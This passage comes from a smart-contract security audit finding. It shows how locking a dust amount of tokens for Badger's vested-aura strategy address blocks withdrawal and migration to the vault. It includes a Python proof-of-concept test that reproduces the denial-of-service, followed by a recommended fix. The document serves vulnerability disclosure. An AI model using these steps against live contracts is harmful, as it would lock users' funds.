The latter function has the following check in place:  [MyStrategy.sol#L184-L187](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187)  ```solidity require(     balanceOfPool() == 0 && LOCKER.balanceOf(address(this)) == 0,     "You have to wait for unlock or have to manually rebalance out of it" ); ```  Funds can only be withdrawn (migrated) if the balance in `LOCKER` is fully unlocked.  By locking a small amount of want tokens via `AuraLocker.lock` with the `strategy` address, a malicious individual can cause DoS and prevent withdrawing and migrating funds to the vault.  ## Proof of Concept  The following test case will replicate the DoS attack by locking "dust" want tokens for the `strategy` address. This causes `vault.withdrawToVault` to revert.  ```python def test_frontrun_migration(locker, deployer, vault, strategy, want, governance, keeper):     # Setup     randomUser = accounts[6]     snap = SnapshotManager(vault, strategy, "StrategySnapshot")      startingBalance = want.balanceOf(deployer)     depositAmount = startingBalance // 2     assert startingBalance >= depositAmount     # End Setup      # Deposit     want.approve(vault, MaxUint256, {"from": deployer})     snap.settDeposit(depositAmount, {"from": deployer})      chain.sleep(15)     chain.mine()      vault.earn({"from": keeper})      chain.snapshot()      # Test no harvests     chain.sleep(86400 * 250)  ## Wait 250 days so we can withdraw later     chain.mine()      before = {"settWant": want.balanceOf(vault), "stratWant": strategy.balanceOf()}      strategy.prepareWithdrawAll({"from": governance})      want.approve(locker, 1, {"from": deployer})     locker.lock(strategy, 1, { "from": deployer }) # Donate "dust" want tokens to strategy      vault.withdrawToVault({"from": governance}) # @audit-info reverts with "You have to wait for unlock or have to manually rebalance"      after = {"settWant": want.balanceOf(vault), "stratWant": strategy.balanceOf()}      assert after["settWant"] > before["settWant"]     assert after["stratWant"] < before["stratWant"]     assert after["stratWant"] == 0 ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Call `LOCKER.processExpiredLocks(false);` in `MyStrategy._withdrawAll` directly and remove the check which enforces unlocking all want tokens on L184-L187.
